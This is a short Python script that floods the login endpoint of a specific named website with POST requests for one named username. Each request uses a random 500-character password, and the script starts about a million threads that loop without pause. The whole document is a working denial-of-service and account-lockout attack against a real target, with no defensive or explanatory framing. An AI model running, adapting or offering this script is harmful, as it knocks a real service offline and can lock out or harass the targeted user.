import requests
import random
import threading
import time

def generate_big_message(length):
    chars = "abcdefghijklmnopqrstuvwxyz123456789+>-*#!()"
    return ''.join(random.choice(chars) for _ in range(length))

def send_requests(username):
    url = "https://middle-star.com/includes/ajax/core/signin.php"
    payload = {
        'username_email': username,
        'password': generate_big_message(500)
    }
    headers = {
        'User-Agent': "Sngine",
        'Accept': "application/json, text/javascript, */*; q=0.01",
        'sec-ch-ua-platform': "\"Android\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua': "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        'sec-ch-ua-mobile': "?1",
        'origin': "https://middle-star.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://middle-star.com/?rid=go7m1fvpoip8mck80ep6r7vkc5",
        'accept-language': "en-US,en;q=0.9",
    }
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        print(response)
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

def sub_worker(username):
    while True:
        send_requests(username)
        #time.sleep(0.5)

def worker_thread(username):
    sub_threads = []
    for _ in range(1000):
        t = threading.Thread(target=sub_worker, args=(username,))
        t.start()
        sub_threads.append(t)
    for t in sub_threads:
        t.join()

threads = []
username = "ahmedjooel"
for _ in range(1000):
    t = threading.Thread(target=worker_thread, args=(username,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
